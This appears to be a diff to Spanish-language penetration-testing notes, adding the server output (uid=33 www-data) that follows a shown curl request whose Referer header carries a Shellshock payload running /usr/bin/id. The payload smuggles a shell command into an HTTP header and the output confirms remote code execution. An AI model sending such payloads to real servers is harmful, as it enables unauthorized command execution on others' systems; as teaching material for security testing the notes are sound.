@@ -1547,6 +1547,16 @@ curl -v --proxy ip:puerto \
   -H "Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id; exit"
 ```
 
+Obteniendo la siguiente respuesta del lado del servidor:
+
+```bash
+*   Trying ip...
+* Connected to ip (ip) port puerto (#0)
+* HTTP 1.0, assume close after body
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+* Closing connection 0
+```
+
 ### Pentesting Web
 
 #### LFI
